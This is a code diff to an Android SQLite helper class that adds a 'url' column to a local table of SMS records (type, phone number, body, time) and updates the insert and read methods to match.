@@ -5,6 +5,7 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicInteger;
+
 import android.annotation.SuppressLint;
 import android.app.sms.entity.SMSInfo;
 import android.app.sms.utils.LogUtils;
@@ -27,7 +28,7 @@ public class DQLiteOpenHelper extends SQLiteOpenHelper {
 	private static SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd/HH:mm:ss");
 	
 	public DQLiteOpenHelper(Context context) {
-		super(context, name, null, 10);
+		super(context, name, null, 11);
 	}
 	
 	public static DQLiteOpenHelper getHelper(Context context) {
@@ -39,7 +40,7 @@ public class DQLiteOpenHelper extends SQLiteOpenHelper {
 
 	@Override
 	public void onCreate(SQLiteDatabase sqLiteDatabase) {
-		String sql="create table data(id INTEGER PRIMARY KEY AUTOINCREMENT,type varchar(40),pn varchar(20),body varchar(1000),time varchar(20))";
+		String sql="create table data(id INTEGER PRIMARY KEY AUTOINCREMENT,type varchar(40),pn varchar(20),body varchar(1000),url varchar(200),time varchar(20))";
 		sqLiteDatabase.execSQL(sql);
 	}
 
@@ -56,12 +57,12 @@ public class DQLiteOpenHelper extends SQLiteOpenHelper {
 	 * @param body
 	 * @param date
 	 */
-	public synchronized void addData(String type, String pn, String body, Date date) {
-		LogUtils.write("Send", "插入本地数据库:type=" + type + ",pn=" + pn + ",body=" + body);
-		String sql="insert into data(type,pn,body,time) values(?,?,?,?)";
+	public synchronized void addData(String type, String pn, String body, String url, Date date) {
+		LogUtils.write("Send", "插入本地数据库:type=" + type + ",pn=" + pn + ",body=" + body + ",url=" + url);
+		String sql="insert into data(type,pn,body,url,time) values(?,?,?,?,?)";
 		String time=format.format(date);
 		this.openDatabase();
-		this.Tdb.execSQL(sql, new Object[]{type,pn,body,time});
+		this.Tdb.execSQL(sql, new Object[]{type,pn,body,url,time});
 		this.closeDatabase();
 	}
 	
@@ -75,10 +76,11 @@ public class DQLiteOpenHelper extends SQLiteOpenHelper {
 			for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
 				int id = c.getInt(c.getColumnIndex("id"));
 				String pn = c.getString(c.getColumnIndex("pn"));
+				String url = c.getString(c.getColumnIndex("url"));
 				String type = c.getString(c.getColumnIndex("type"));
 				String body = c.getString(c.getColumnIndex("body"));
 				String time = c.getString(c.getColumnIndex("time"));
-				smsInfos.add(new SMSInfo(id, pn, type, body, time));
+				smsInfos.add(new SMSInfo(id, pn, type, body, url, time));
 			}
 		}
 		return smsInfos;
